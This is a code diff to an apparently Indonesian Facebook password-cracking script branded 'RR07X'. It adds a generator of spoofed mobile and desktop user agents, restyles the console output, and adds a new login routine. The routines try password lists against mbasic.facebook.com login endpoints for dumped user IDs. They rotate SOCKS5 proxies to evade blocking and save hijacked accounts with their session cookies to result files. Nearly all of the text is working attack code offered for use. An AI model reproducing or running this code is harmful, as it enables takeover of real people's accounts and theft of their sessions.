@@ -86,6 +86,37 @@ class REQ:
              return proxy
           except requests.exceptions.ConnectionError as e:
              sleep(3.2) ; self.get_Proxy()
+   for xd in range(10000):
+	   rr = random.randint; rc = random.choice
+	   a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
+	   b=random.randrange(111111,210000)
+	   c=random.randrange(73,110)
+	   d=random.randrange(33300,88800)
+	   e=random.randrange(40,250)
+	   z=random.randrange(113,117)
+	   h=random.randrange(11,19)
+	   t=random.randrange(0,10525)
+	   g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
+	   i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
+	   ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
+	   oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
+	   oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
+	   rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
+	   crot=random.choice(['Win64; x64','WOW64'])
+	   redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
+	   model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
+	   iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
+	   iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
+	   iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
+	   zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
+	   zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
+	   zax3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
+	   zax4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
+	   zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
+	   aseph=f'Mozilla/5.0 (Windows NT 10.0; {crot} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Safari/537.36 Edge/12.{t}'
+	   hi=f'Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36{model}'
+	   uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5,aseph,hi])
+	   ugen.append(uaku2)
    
    def UserAgent(self):
        self.rr = random.randint
@@ -508,11 +539,11 @@ class Furthermore:
             Console().print(f'\n[•]{U2} Selamat, Anda Mendapatkan {U2}Hasil OK {H2} {len(self.live)} {U2}Dan Hasil CP {K2}: {len(self.check)}') ; os.system('rm -rf DataLog/socks5.txt') ; sleep(3) ; sys.exit()
    
    def asyncAPI(self, user, password):
-       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
        prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().get_Proxy()
-       ua = REQ().UserAgent()
+       ua = random.choice(ugen)
        for pw in password:
            try:
                proxis = {'http': 'socks5://' + random.choice(proxx)}
@@ -567,7 +598,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
+                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
@@ -575,7 +606,7 @@ class Furthermore:
                         r.write(kntl+"\n")
                   break
                elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
+                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
                     kntl = (f"{user}|{pw}")
                     self.check.append(kntl)
                     with open("Results/cp.txt", "a", encoding="utf-8") as r:
@@ -584,17 +615,17 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
    
    def validateAPI(self, user, password):
-       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
-       prog.advance(des) 
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.advance(des)  
        ses = requests.Session()
        proxx = REQ().get_Proxy()
-       ua = REQ().UserAgent_API()
+       ua = random.choice(ugen)
        for pw in password:
            try:
                proxis = {'http': 'socks5://' + random.choice(proxx)}
@@ -638,7 +669,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
+                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
@@ -646,7 +677,7 @@ class Furthermore:
                         r.write(kntl+"\n")
                   break
                elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
+                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
                     kntl = (f"{user}|{pw}")
                     self.check.append(kntl)
                     with open("Results/cp.txt", "a", encoding="utf-8") as r:
@@ -655,17 +686,17 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
    
    def regularAPI(self, user, password):
-       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
-       prog.advance(des) 
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.advance(des)  
        ses = requests.Session()
        proxx = REQ().get_Proxy()
-       ua = REQ().UserAgent()
+       ua = random.choice(ugen)
        for pw in password:
            try:
                proxis = {'http': 'socks5://' + random.choice(proxx)}
@@ -705,7 +736,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
+                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
@@ -713,7 +744,7 @@ class Furthermore:
                         r.write(kntl+"\n")
                   break
                elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
+                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
                     kntl = (f"{user}|{pw}")
                     self.check.append(kntl)
                     with open("Results/cp.txt", "a", encoding="utf-8") as r:
@@ -722,17 +753,17 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
    
    def asyncAPP(self, user, password):
-       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
        prog.advance(des) 
        ses = requests.Session()
        proxx = REQ().get_Proxy()
-       ua = REQ().UserAgent_APP()
+       ua = random.choice(ugen)
        for pw in password:
            try:
                proxis = {'http': 'socks5://' + random.choice(proxx)}
@@ -787,7 +818,7 @@ class Furthermore:
                if "c_user" in ses.cookies.get_dict():
                   kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                   tree = Tree(f"\r",guide_style="bold grey100")
-                  tree.add(f"{H2}{user} | {pw}").add(f'{H2}{kuki} {ua}')
+                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
                   prints(tree)
                   kntl = (f"{user}|{pw}|{kuki}")
                   self.live.append(kntl)
@@ -795,7 +826,7 @@ class Furthermore:
                         r.write(kntl+"\n")
                   break
                elif "checkpoint" in ses.cookies.get_dict():
-                    tree.add(f"{K2}{user} | {pw}").add(f'{K2}{ua}')
+                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
                     kntl = (f"{user}|{pw}")
                     self.check.append(kntl)
                     with open("Results/cp.txt", "a", encoding="utf-8") as r:
@@ -804,8 +835,79 @@ class Furthermore:
                else:
                     continue
            except requests.exceptions.ConnectionError as e:
-               prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
-               prog.advance(des)
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
+               sleep(15)
+       self.loop+=1
+   
+   def validateAPP(self, user, password):
+       prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+       prog.advance(des) 
+       ses = requests.Session()
+       proxx = REQ().UserAgent_APP()
+       ua = random.choice(ugen)
+       for pw in password:
+           try:
+               proxis = {'http': 'socks5://' + random.choice(proxx)}
+               link = ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers = {'User-Agent':ua})
+               data = {
+                 "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
+                 "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
+                 "uid":user,
+                 "next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
+                 "flow":"login_no_pin",
+                 "pass":pw
+               }
+               headers = {
+                  "Host": "mbasic.facebook.com",
+                  "content-length": "746",
+                  "cache-control": "max-age=0",
+                  "dpr": "1.4375",
+                  "viewport-width": "980",
+                  "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
+                  "sec-ch-ua-mobile": "?1",
+                  "sec-ch-ua-platform": '"Android"',
+                  "sec-ch-ua-platform-version": '"12.0.0"',
+                  "sec-ch-ua-model": '"CPH2127"',
+                  "sec-ch-ua-full-version-list": '"Google Chrome";v="117.0.5938.61", "Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.61"',
+                  "sec-ch-prefers-color-scheme": "light",
+                  "upgrade-insecure-requests": "1",
+                  "origin": "https://mbasic.facebook.com",
+                  "content-type": "application/x-www-form-urlencoded",
+                  "user-agent": ua,
+                  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                  "sec-fetch-site": "same-origin",
+                  "sec-fetch-mode": "navigate",
+                  "sec-fetch-user": "?1",
+                  "sec-fetch-dest": "document",
+                  "referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+                  "accept-encoding": "gzip, deflate, br",
+                  "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,vi;q=0.6,ms;q=0.5"
+               }
+               cokii = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+               response = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',cookies = {'cookie':cokii}, data = data, headers = headers, proxies = proxis, allow_redirects=True)
+               if "c_user" in ses.cookies.get_dict():
+                  kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                  tree = Tree(f"\r",guide_style="bold grey100")
+                  tree.add(f"{H2}  ⫸{P2} {user}\n {H2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶ {H2}{kuki}\n {P2}  ╰─▶{U2}{ua}{x}')
+                  prints(tree)
+                  kntl = (f"{user}|{pw}|{kuki}")
+                  self.live.append(kntl)
+                  with open("Results/ok.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                  break
+               elif "checkpoint" in ses.cookies.get_dict():
+                    tree.add(f"{K2}  ⫸{P2} {user}\n {K2}  ⫸{P2} {pw}\n").add(f'{P2}  ╰─▶{U2}{ua}')
+                    kntl = (f"{user}|{pw}")
+                    self.check.append(kntl)
+                    with open("Results/cp.txt", "a", encoding="utf-8") as r:
+                        r.write(kntl+"\n")
+                    break
+               else:
+                    continue
+           except requests.exceptions.ConnectionError as e:
+               prog.update(des,description=f"[{asu}RR07X{x}] [{asu}{self.loop}/{len(dump)}{x}] [{U2}LIVE-:{H2}{len(self.live)}{x}] [{U2}CHECK-:{K2}{len(self.check)}{x}] [{asu}{user}{x}]")
+               prog.advance(des) 
                sleep(15)
        self.loop+=1
 #----------------------[ LICENSE ]---------------------#
